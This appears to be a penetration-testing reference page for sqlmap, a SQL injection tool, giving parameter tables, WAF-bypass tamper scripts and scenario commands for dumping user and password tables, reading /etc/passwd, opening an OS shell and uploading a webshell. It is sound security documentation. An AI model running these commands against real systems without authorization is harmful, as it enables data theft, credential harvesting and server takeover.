# sqlmap

- **Category**: Web / SQL Injection
- **Risk Level**: 🔴 High

---

## Description

sqlmap is an open-source automated SQL injection detection and exploitation tool. It supports MySQL, Oracle, PostgreSQL, MSSQL, SQLite, Access, and other major databases. It can automatically detect and exploit SQL injection vulnerabilities, supporting database enumeration, data extraction, operating system command execution (under specific conditions), and file read/write.

**Core Capabilities:**
- Automatically detect GET/POST/Cookie/Header injection points
- Supports UNION, blind injection (Boolean/Time-based), error injection, and other techniques
- Built-in Tamper scripts to bypass WAF/IDS
- Supports importing request packets from Burp Suite

## Installation

```bash
apt install sqlmap

# Get the latest version from GitHub
git clone https://github.com/sqlmapproject/sqlmap.git
```

## Parameter Reference

### Target Configuration

| Parameter | Description |
|------|------|
| `-u URL` | Specify target URL (GET request) |
| `-d DIRECT` | Direct database connection |
| `-l LOGFILE` | Load targets from a Burp/WebScarab log file |
| `-r REQUESTFILE` | Load HTTP request from file (including POST data) |
| `-g GOOGLEDORK` | Process Google dork results as target URLs |
| `-m BULKFILE` | Batch load multiple targets from file |

### Request Configuration

| Parameter | Description |
|------|------|
| `--data=DATA` | POST data string |
| `--cookie=COOKIE` | HTTP Cookie value |
| `--random-agent` | Use randomly selected HTTP User-Agent header value |
| `--user-agent=AGENT` | Specify User-Agent |
| `--headers=HEADERS` | Add extra HTTP headers (newline-separated) |
| `--proxy=PROXY` | Use a proxy to connect to the target URL |
| `--tor` | Use Tor anonymization network |
| `--delay=DELAY` | Seconds between each request |
| `--timeout=TIMEOUT` | Timeout in seconds (default 30) |
| `--retries=RETRIES` | Connection failure retry count (default 3) |
| `--level=LEVEL` | Level of tests to perform (1-5, default 1) |
| `--risk=RISK` | Risk of tests to perform (1-3, default 1) |

### Injection Techniques

| Parameter | Description |
|------|------|
| `--technique=TECH` | SQL injection techniques to use (default "BEUSTQ") |
| `--time-sec=TIMESEC` | Time-based blind injection delay in seconds (default 5) |
| `--union-cols=UCOLS` | UNION query column count range (e.g., 1-20) |
| `--string=STRING` | String indicating true result in Boolean blind injection |
| `--not-string=NSTRING` | String indicating false result |
| `--dbms=DBMS` | Force back-end DBMS to provided value |

### Enumeration

| Parameter | Description |
|------|------|
| `--dbs` | Enumerate all databases |
| `--current-db` | Retrieve DBMS current database |
| `--current-user` | Retrieve DBMS current user |
| `--tables` | Enumerate DBMS database tables |
| `--columns` | Enumerate DBMS database table columns |
| `--dump` | Dump DBMS database table entries |
| `--dump-all` | Dump all DBMS databases tables entries |
| `-D DB` | Database to enumerate |
| `-T TBL` | Database table(s) to enumerate |
| `-C COL` | Database table column(s) to enumerate |
| `--count` | Count rows only |
| `--start=LIMITSTART` | Start export from this row |
| `--stop=LIMITSTOP` | Stop export at this row |
| `--where=WHERE` | Add WHERE filter condition |

### Privileged Operations

| Parameter | Description |
|------|------|
| `--is-dba` | Check if current user is a DBA |
| `--users` | Enumerate database users |
| `--passwords` | Enumerate password hashes |
| `--privileges` | Enumerate user privileges |
| `--file-read=FILE` | Read a file from the server |
| `--file-write=FILE` | Write a local file to the server |
| `--file-dest=FILE` | Server destination path |
| `--os-shell` | Prompt for an interactive operating system shell |
| `--os-cmd=OSCMD` | Execute an OS command |

### Bypass and Optimization

| Parameter | Description |
|------|------|
| `--tamper=TAMPER` | Use Tamper scripts (comma-separated for multiple) |
| `--hex` | Use hexadecimal encoding |
| `--no-cast` | Disable payload casting |
| `--prefix=PREFIX` | Injection prefix |
| `--suffix=SUFFIX` | Injection suffix |
| `--skip-waf` | Skip WAF/IDS detection |
| `--threads=THREADS` | Concurrent threads (default 1, max 10) |
| `--batch` | Never ask for user input, use the default behavior |
| `--flush-session` | Flush session files for current target |
| `--fresh-queries` | Ignore cached query results in session |

### Output Control

| Parameter | Description |
|------|------|
| `-v VERBOSE` | Verbosity level 0-6 (default 1) |
| `--output-dir=DIR` | Custom output directory |
| `--answers=ANSWERS` | Pre-set answers to prompts (e.g., quit=N) |

### Common Tamper Scripts

| Tamper | Purpose |
|--------|------|
| `space2comment` | Replace spaces with `/**/` |
| `between` | Replace `>` with `BETWEEN` |
| `randomcase` | Randomize character case |
| `base64encode` | Base64 encode payload |
| `charencode` | URL encode |
| `charunicodeencode` | Unicode encode |
| `equaltolike` | Replace `=` with `LIKE` |
| `greatest` | Replace `>` with `GREATEST()` |
| `ifnull2ifisnull` | Replace `IFNULL()` |
| `modsecurityversioned` | Replace space with version comment |
| `multiplespaces` | Multiple space obfuscation |
| `nonrecursivereplacement` | Double-write to bypass filters |
| `unmagicquotes` | Wide-byte injection (GBK encoding bypass) |

## Common Commands

### Scenario 1: Basic GET Injection Detection

```bash
# Check if URL parameter has an injection
sqlmap -u "http://target.com/page.php?id=1"

# Auto batch mode, detect and list databases
sqlmap -u "http://target.com/page.php?id=1" --batch --dbs
```

### Scenario 2: POST Request Injection

```bash
# Specify POST data
sqlmap -u "http://target.com/login.php" \
  --data="username=admin&password=test" \
  --dbs

# Test only a specified parameter (mark injection point with *)
sqlmap -u "http://target.com/login.php" \
  --data="username=admin*&password=test"
```

### Scenario 3: Import from Burp Suite Request File

```bash
# Save Burp-captured request as request.txt, then use it
sqlmap -r request.txt --batch --dbs

# Specify the parameter to test
sqlmap -r request.txt -p "id,username" --batch
```

### Scenario 4: Cookie Injection

```bash
sqlmap -u "http://target.com/page.php" \
  --cookie="session=abc123; user_id=1*" \
  --level=2
```

### Scenario 5: Bypass WAF

```bash
# Use random User-Agent + common Tamper scripts
sqlmap -u "http://target.com/page.php?id=1" \
  --random-agent \
  --tamper=space2comment,between,randomcase \
  --delay=1 \
  --batch

# Common Tamper script combination
sqlmap -u "http://target.com/page.php?id=1" \
  --tamper=apostrophemask,apostrophenullencode,base64encode
```

### Scenario 6: Data Extraction

```bash
# Get current database and user
sqlmap -u "http://target.com/page.php?id=1" --current-db --current-user

# Enumerate all tables in a specified database
sqlmap -u "http://target.com/page.php?id=1" -D webapp --tables

# Export data from a specified table
sqlmap -u "http://target.com/page.php?id=1" \
  -D webapp -T users --dump

# Export specific columns with row limit
sqlmap -u "http://target.com/page.php?id=1" \
  -D webapp -T users -C "username,password" \
  --start=1 --stop=50 --dump
```

### Scenario 7: Privilege Escalation and Command Execution

```bash
# Check for DBA privileges
sqlmap -u "http://target.com/page.php?id=1" --is-dba

# Attempt to get an OS shell (requires DBA privileges)
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# Read a server file
sqlmap -u "http://target.com/page.php?id=1" \
  --file-read="/etc/passwd"

# Upload a file (Webshell)
sqlmap -u "http://target.com/page.php?id=1" \
  --file-write="shell.php" \
  --file-dest="/var/www/html/shell.php"
```

### Scenario 8: Use Proxy (with Burp Suite)

```bash
sqlmap -u "http://target.com/page.php?id=1" \
  --proxy="http://127.0.0.1:8080" \
  --batch
```

## Notes & Tips

1. **Authorized testing only**: Use only on targets for which you have explicit authorization. Unauthorized testing is illegal.
2. **`--level` and `--risk`**: `level=2` extends tests to Cookie header; `level=3` also adds User-Agent and Referer headers. So Cookie injection is tested at level 2+, not just level 3+. `risk=3` uses UPDATE statements that may modify database data — use with caution.
3. **`--batch` mode**: Avoid unrestricted `--dump-all` in production environments; data volume is enormous and leaves extensive logs.
4. **Session cache**: sqlmap saves session files in `~/.local/share/sqlmap/output/`; use `--flush-session` to refresh when retesting.
5. **Multi-threading**: Maximum recommended `--threads` is 5; too high may cause DoS or trigger IP banning.
6. **HTTPS**: sqlmap handles SSL/TLS automatically. If certificate errors occur, sqlmap will prompt with options; use `--batch` to accept defaults automatically.
7. **Signing proxy + time-based blind**: when using `--proxy` through a signing proxy that injects dynamic timestamps, exclude time-based technique (`--technique=BEUS`) to avoid false positives from unstable response-time baselines.
8. **Detached mode stdin**: running `sqlmap -r <file>` in detached mode (`docker exec -d`) causes stdin closure — sqlmap may fall back to reading stdin and exit silently. Use `-u` with explicit URL instead, or redirect stdin: `sqlmap -r file.txt --batch < /dev/null`.
9. Output interpretation: `[INFO] parameter 'x' is vulnerable` means the injection point is confirmed — use `--dbs` to enumerate databases, or `--os-shell` if authorized. `[INFO] the back-end DBMS is MySQL` identifies the database type — use DB-specific flags like `--tables`, `--columns`, `--sql-query`. `[WARNING] ...target is protected by some kind of WAF/IPS` indicates a Web Application Firewall — try `--tamper=space2comment` or `--tamper=between` to bypass and increase `--delay`. `[CRITICAL] connection timed out` means the target is unreachable or the IP is banned — increase `--delay`, route through a proxy (`--proxy`), or pause and retry. `[WARNING] target URL content is stable` means the baseline page returns consistent content (good for boolean-based testing) — proceed with injection testing. `[INFO] cracked password` means a hash was cracked from the database dump — record the clear-text password and note which users/hosts it works on. `sqlmap identified the following injection points` with no DBMS line means injection exists but the DB type couldn't be fingerprinted — try `--dbms=<guess>` to force a specific back-end.

---

## Official References

- [sqlmap GitHub](https://github.com/sqlmapproject/sqlmap)
- [sqlmap Wiki](https://github.com/sqlmapproject/sqlmap/wiki)
- [sqlmap Official Site](https://sqlmap.org/)
